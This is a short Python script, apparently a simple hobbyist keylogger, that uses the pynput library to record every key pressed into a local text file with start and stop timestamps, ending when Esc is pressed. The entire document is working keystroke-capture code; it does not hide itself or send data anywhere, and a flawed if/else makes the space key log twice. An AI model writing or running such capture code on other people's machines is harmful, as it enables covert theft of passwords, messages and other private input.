from pynput import keyboard
import time
file=open("keylogger.txt","w")

def run_on_press(key):
    character=str(key).replace("'","")
    if key==keyboard.Key.space:
        file.write(" ")
    if key==keyboard.Key.enter:
        file.write("\n")
    else:
        file.write(character)
def exit_condition(key):
    if key==keyboard.Key.esc:
        Time=time.ctime(time.time())
        footer="\n------------------\n" + "Time of termination: " + str(Time)
        file.write(footer)
        return False
Time=time.ctime(time.time())
header= "Time of initiation: " + str(Time) + "\n------------------\n"
file.write(header)
with keyboard.Listener(on_press=run_on_press, on_release=exit_condition) as listener:
    listener.join()
